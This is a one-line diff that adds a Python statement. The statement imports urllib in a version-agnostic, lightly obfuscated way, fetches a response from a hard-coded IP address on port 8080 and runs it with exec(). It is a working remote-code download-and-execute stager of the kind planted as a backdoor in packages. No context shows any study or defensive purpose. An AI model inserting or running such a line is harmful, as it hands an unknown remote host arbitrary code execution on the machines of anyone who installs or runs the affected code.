@@ -1,0 +1,1 @@
+import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://68.183.67.250:8080/');exec(r.read());
